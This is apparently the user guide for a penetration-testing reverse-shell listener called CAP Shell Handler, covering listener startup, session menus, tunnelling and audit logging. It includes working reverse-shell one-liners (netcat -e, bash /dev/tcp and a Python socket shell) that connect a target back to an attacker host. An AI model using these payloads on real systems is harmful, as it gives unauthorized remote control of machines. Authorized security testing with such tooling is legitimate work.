# CAP Shell Handler - Quick Guide

## Overview

The CAP Shell Handler provides a Penelope-style interactive shell listener for managing reverse shell connections. It features keyboard-driven controls, multi-session management, and non-blocking I/O for seamless operator workflow.

## Starting the Listener

```bash
# Basic listener
cap shell listen

# Custom host/port
cap shell listen --host 0.0.0.0 --port 4444
```

## Connecting from Target

From your target machine, establish a reverse shell:

```bash
# Linux/Unix
nc <your-ip> 4444 -e /bin/bash
bash -i >& /dev/tcp/<your-ip>/4444 0>&1

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your-ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Interactive Control Menu

### Opening the Menu

Press **F12** while in the interactive terminal to open the control menu.

### Menu Options

1. **Close Menu** - Return to active shell
2. **Background Current Session** - Move active shell to background
3. **Cleanup Terminated Sessions** - Remove dead connections
4. **Session List** - Shows all active/backgrounded sessions
   - `●` Green dot = Active session
   - `◐` Yellow dot = Backgrounded session
   - `○` Red dot = Terminated session

### Navigation

- **Arrow Up/Down** - Navigate menu items
- **Enter** - Select option
- **F12 / ESC** - Close menu
- **Ctrl+C** - Exit CAP entirely

## Session Management

### Viewing Sessions

Inside the F12 menu, all sessions are listed with their:
- State indicator (●/◐/○)
- Session ID (first 8 characters)
- Remote address
- Connection time

### Switching Sessions

1. Press **F12** to open menu
2. Navigate to desired session
3. Press **Enter** to foreground that session

### Backgrounding Sessions

1. Press **F12** to open menu
2. Select "Background Current Session"
3. Session continues running in background

### Killing Sessions

1. Press **F12** to open menu
2. Navigate to session to terminate
3. Session will be marked as terminated
4. Use "Cleanup Terminated Sessions" to remove

## Features

### Non-Blocking I/O
- Multiple shells run concurrently
- Switching between sessions is instant
- No shell state is lost when backgrounding

### Output Buffering
- Last 1000 lines buffered per session
- Output history preserved when switching
- Real-time display with minimal latency

### Auto-Cleanup
- Terminated sessions auto-cleaned every 30 seconds
- Dead connections detected automatically
- No manual cleanup required

### Session State Tracking
- **Active** - Currently in foreground, receiving input
- **Background** - Running but not receiving input
- **Terminated** - Connection closed, awaiting cleanup

## Example Workflow

```bash
# 1. Start listener
cap shell listen --host 0.0.0.0 --port 4444

# 2. Connect from first target
# Target 1: nc attacker-ip 4444 -e /bin/bash

# 3. Interact with first shell
whoami
hostname

# 4. Background first shell (F12 → Background)

# 5. Connect from second target
# Target 2: nc attacker-ip 4444 -e /bin/bash

# 6. Second shell is now active
pwd

# 7. Switch back to first shell (F12 → Select Session 1)

# 8. Continue interacting with first shell
ls -la

# 9. View all sessions (F12)
# See both shells listed with state indicators
```

## Advanced Usage

### Multiple Listeners

You can run multiple CAP listeners on different ports:

```bash
# Terminal 1
cap shell listen --port 4444

# Terminal 2
cap shell listen --port 5555
```

### Port Forwarding

Forward listener port through firewall/router for remote access:

```bash
# On firewall
iptables -t nat -A PREROUTING -p tcp --dport 4444 -j DNAT --to-destination <internal-ip>:4444
```

### Over SSH Tunnel

For secure shell handling over untrusted networks:

```bash
# On operator machine
ssh -L 4444:localhost:4444 remote-server

# On remote-server
cap shell listen --host 127.0.0.1 --port 4444
```

## Troubleshooting

### Shell Not Responding

- Check if session is in background (F12 to view)
- Verify network connectivity
- Check firewall rules

### Connection Drops

- Sessions auto-cleanup after detection
- Check terminal window size
- Verify target system shell availability

### Output Not Displaying

- Press F12 to refresh menu
- Check if shell process is still running on target
- Verify network latency

## Security Considerations

### Encrypted Communications

The shell handler uses raw TCP. For encrypted shells:

```bash
# Use SSL/TLS wrapper
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0 TCP:localhost:4444

# Or SSH tunneling
ssh -R 4444:localhost:4444 remote-host
```

### Audit Logging

All shell connections are logged with:
- Connection timestamp
- Remote IP address
- Session ID
- Operator username

### Access Control

- Bind to 127.0.0.1 for local-only access
- Use firewall rules to restrict source IPs
- Implement authentication at application level

## Integration with CAP

### Using with Other Modules

```bash
# 1. Enumerate target
cap module --name dns-enum --target example.com

# 2. Scan discovered hosts
cap module --name port-scan --target 192.168.1.100

# 3. Exploit vulnerability (outside CAP)
# ...

# 4. Catch shell with CAP
cap shell listen --port 4444
```

### API Integration

Start shell listener programmatically:

```bash
# Via API call
curl -X POST http://localhost:8443/api/shell/listen \
  -H "Content-Type: application/json" \
  -d '{
    "host": "0.0.0.0",
    "port": 4444
  }'
```

## Best Practices

1. **Always use authorized scope** - Add targets to scope first
2. **Monitor sessions actively** - Use F12 menu regularly
3. **Background idle sessions** - Keep active shell focused
4. **Clean up regularly** - Remove terminated sessions
5. **Document activities** - Use audit logs for compliance
6. **Use encrypted channels** - Wrap with TLS/SSH when possible

## Keyboard Shortcuts Reference

| Key | Action |
|-----|--------|
| **F12** | Open/Close control menu |
| **↑** | Navigate up in menu |
| **↓** | Navigate down in menu |
| **Enter** | Execute menu action or send command |
| **Backspace** | Delete character in command input |
| **ESC** | Close control menu |
| **Ctrl+C** | Exit CAP shell handler |

## Comparison with Other Tools

### vs. Netcat
- ✅ Multiple sessions
- ✅ Session persistence
- ✅ Interactive menu
- ✅ Auto-cleanup

### vs. Metasploit Handler
- ✅ Lighter weight
- ✅ Faster startup
- ✅ Keyboard-driven
- ❌ No staged payloads

### vs. Penelope
- ✅ Rust-based (safer)
- ✅ Integrated with CAP
- ✅ Audit logging
- ⚖️ Similar UI/UX

## Contributing

To enhance the shell handler:

1. Add features to `src/shell/`
2. Update terminal UI in `terminal.rs`
3. Maintain audit logging
4. Test with various shell types
5. Document new features

## Support

- GitHub Issues: [https://github.com/declanmiddleton/cap/issues](https://github.com/declanmiddleton/cap/issues)
- Discussions: [https://github.com/declanmiddleton/cap/discussions](https://github.com/declanmiddleton/cap/discussions)

---

**Remember**: Only use CAP Shell Handler on systems you own or have explicit permission to test. Unauthorized access is illegal.

